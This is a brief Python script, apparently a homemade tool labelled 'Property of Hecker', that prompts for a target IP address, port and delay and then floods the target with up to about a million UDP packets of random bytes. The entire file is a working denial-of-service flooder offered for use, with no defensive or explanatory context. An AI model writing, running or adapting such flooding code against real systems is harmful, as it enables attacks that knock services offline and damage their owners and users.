import socket
import random
import time

print('Property of Hecker')
print('****************************')
print('Copyright Hecker,2023')
print('****************************')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
ip = input("Enter target's IP: ")
port = int(input("Enter target's port: "))
sleep = float(input("Sleep: "))

s.connect((ip, port))

for i in range(1, 100 * 10000):
    s.send(random._urandom(1000))
    print(f"send: {i}", end='\r')
    time.sleep(sleep)